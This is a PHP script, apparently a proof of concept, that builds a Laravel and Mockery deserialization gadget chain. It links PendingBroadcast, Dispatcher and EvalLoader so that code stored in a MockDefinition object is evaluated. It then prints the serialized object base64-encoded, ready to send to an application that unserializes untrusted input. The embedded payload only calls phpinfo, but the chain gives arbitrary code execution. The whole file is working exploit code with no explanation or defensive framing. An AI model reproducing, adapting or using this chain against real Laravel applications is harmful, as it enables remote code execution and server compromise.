<?php

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $event;
        protected $events;
        function __construct($class1, $class2)
        {
            $this->event = $class1;
            $this->events = $class2;
        }
    }

    class BroadcastEvent {
        public $connection;

        function __construct($param)
        {
            $this->connection = $param;
        }

    }
}

namespace Illuminate\Bus
{
    class Dispatcher
    {
        protected $queueResolver;
        function __construct($function)
        {
            $this->queueResolver = $function;
        }
    }
}

namespace Mockery\Loader
{
    class EvalLoader
    {

    }
}

namespace Mockery\Generator
{
    class MockDefinition
    {
        protected $code;
        protected $config;
        function __construct($code, $config)
        {
            $this->code = $code;
            $this->config = $config;
        }
    }

    class MockConfiguration
    {
        protected $name;
        function __construct()
        {
            $this->name = "XXX";
        }
    }
}

namespace {
    $evalLoader = new Mockery\Loader\EvalLoader();
    $mockConfiguration = new Mockery\Generator\MockConfiguration();
    $mockDefinition = new Mockery\Generator\MockDefinition("<?php phpinfo();exit;", $mockConfiguration);
    $broadcastEvent = new Illuminate\Broadcasting\BroadcastEvent($mockDefinition);
    $dispatcher = new Illuminate\Bus\Dispatcher([$evalLoader, "load"]);
    $pendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($broadcastEvent, $dispatcher);

    print_r(base64_encode(serialize($pendingBroadcast)));
}